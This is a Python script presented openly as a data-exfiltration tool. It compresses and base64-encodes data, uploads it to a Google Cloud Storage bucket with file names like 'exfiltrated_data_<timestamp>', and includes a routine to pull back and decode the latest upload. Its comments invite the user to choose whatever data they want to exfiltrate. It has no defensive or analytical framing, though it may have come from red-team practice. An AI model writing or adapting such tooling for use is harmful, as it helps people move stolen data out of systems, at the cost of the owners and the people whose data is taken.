import zlib
import base64
import time
from datetime import datetime
from google.cloud import storage

# ==========================
# Configuration Constants
# ==========================

# GCS bucket name - Replace with your actual bucket name
GCS_BUCKET_NAME = "Your_bucket_name_here"

# Path to your Google Cloud service account key JSON file
SERVICE_ACCOUNT_KEY_PATH = "Path/to/your/key/here.json"

# Data to be exfiltrated (in real use, this would be dynamic)
DATA_TO_EXFILTRATE = "This is a placeholder for you. Use your imagination for what type of data you want to exfiltrate."

# ==========================
# Helper Functions
# ==========================

def log_event(message):
    """Log significant events with a timestamp."""
    print(message)

def upload_to_gcs(bucket_name, object_name, data):
    """
    Upload data to Google Cloud Storage bucket.

    Args:
        bucket_name (str): Name of the GCS bucket.
        object_name (str): The name of the file to be uploaded.
        data (str): The data to be uploaded to GCS.

    This function handles the uploading of data to a specified GCS bucket.
    """
    try:
        # Create a client to interact with Google Cloud Storage
        storage_client = storage.Client.from_service_account_json(SERVICE_ACCOUNT_KEY_PATH)
        bucket = storage_client.bucket(bucket_name)
        blob = bucket.blob(object_name)
        blob.upload_from_string(data)
        log_event(f"Data uploaded to GCS bucket {bucket_name} as {object_name}")
    except Exception as e:
        log_event(f"GCS upload failed: {e}")

def get_most_recent_file(bucket_name):
    """
    Retrieve the most recently uploaded file from the GCS bucket.

    Args:
        bucket_name (str): Name of the GCS bucket.

    Returns:
        google.cloud.storage.blob.Blob: The most recent blob in the bucket.
    """
    try:
        # Create a client and list all blobs in the specified bucket
        storage_client = storage.Client.from_service_account_json(SERVICE_ACCOUNT_KEY_PATH)
        bucket = storage_client.bucket(bucket_name)
        blobs = list(bucket.list_blobs())

        if not blobs:
            log_event("No files found in the bucket.")
            return None

        # Sort blobs by creation date (latest first)
        blobs.sort(key=lambda blob: blob.time_created, reverse=True)
        latest_blob = blobs[0]
        log_event(f"Most recent file found: {latest_blob.name}")
        return latest_blob
    except Exception as e:
        log_event(f"Failed to list files in GCS bucket: {e}")
        return None

def download_and_decode_blob(blob):
    """
    Download and decode the most recent file from GCS.

    Args:
        blob (google.cloud.storage.blob.Blob): The blob to be downloaded and decoded.

    This function downloads the compressed, base64-encoded data from the blob,
    decodes it, and then decompresses it to reveal the original data.
    """
    try:
        compressed_data = blob.download_as_string()
        log_event(f"Downloaded data from {blob.name}")
        
        # Decode base64
        decoded_data = base64.b64decode(compressed_data)
        
        # Decompress
        original_data = zlib.decompress(decoded_data)
        
        log_event(f"Original Data: {original_data.decode('utf-8')}")
    except Exception as e:
        log_event(f"Failed to download and decode the blob: {e}")

def exfiltrate_data(method):
    """
    Perform data exfiltration using the specified method.

    Args:
        method (str): The method to use for exfiltration (e.g., 'cloud_storage').

    This example method compresses and encodes the data, then uploads it to a GCS bucket.
    """
    compressed_data = zlib.compress(DATA_TO_EXFILTRATE.encode())
    encrypted_data = base64.b64encode(compressed_data).decode()

    if method == "cloud_storage":
        log_event("Data Exfiltration via Google Cloud Storage")
        try:
            # Create a filename with a readable timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            object_name = f"exfiltrated_data_{timestamp}.gz"  # Dynamic object name
            upload_to_gcs(GCS_BUCKET_NAME, object_name, encrypted_data)
        except Exception as e:
            log_event(f"GCS Exfiltration failed: {e}")

def automate_retrieval_and_decoding():
    """
    Automate the process of retrieving and decoding the most recent file from GCS.

    This function retrieves the most recent file uploaded to the specified GCS bucket,
    downloads it, and decodes the content for further use.
    """
    log_event("Starting automation to retrieve and decode the most recent file.")
    latest_blob = get_most_recent_file(GCS_BUCKET_NAME)
    
    if latest_blob:
        download_and_decode_blob(latest_blob)
    else:
        log_event("No files available for download.")

# ==========================
# Main Execution
# ==========================

# Example call to exfiltrate data via GCS
exfiltrate_data("cloud_storage")

# Automate retrieval and decoding
automate_retrieval_and_decoding()
